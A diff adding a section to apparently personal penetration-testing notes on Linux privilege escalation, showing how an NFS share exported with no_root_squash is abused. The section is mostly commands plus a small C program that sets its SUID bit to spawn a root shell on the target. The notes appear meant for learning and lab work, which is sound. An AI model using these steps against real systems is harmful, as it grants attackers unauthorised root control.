@@ -2989,6 +2989,42 @@ Privilege Escalation
                                     root
 
 
+        NFS
+
+          Network File Sharing configuration
+
+            RHOST
+                cat /etc/exports
+                    no_root_squash
+                        By default, NFS will change the root user to nfsnobody and strip any file from operating with root privileges
+                        If the no_root_squash option is present, we can create an executable with SUID bit set and run it
+
+            LHOST
+                showmount -e <rhost>
+                    ...
+                    /<example>
+                    ...
+                mkdir /tmp/<example>
+                mount -o rw <rhost>:/<example> /tmp/<example>
+                    Mount one of the no_root_squash shares to our attacking machine and start building our executable
+                vim nfs.c
+                    int main()
+                    {   setgid(0);
+                        setuid(0);
+                        system("/bin/bash");
+                        return 0;
+                    }
+                gcc nfs.c -o nfs -w
+                chmod +s nfs
+
+            RHOST
+                cd /<example>
+                whoami
+                    <user>
+                ls -al
+                ./nfs
+                whoami
+                    root
 
 
 
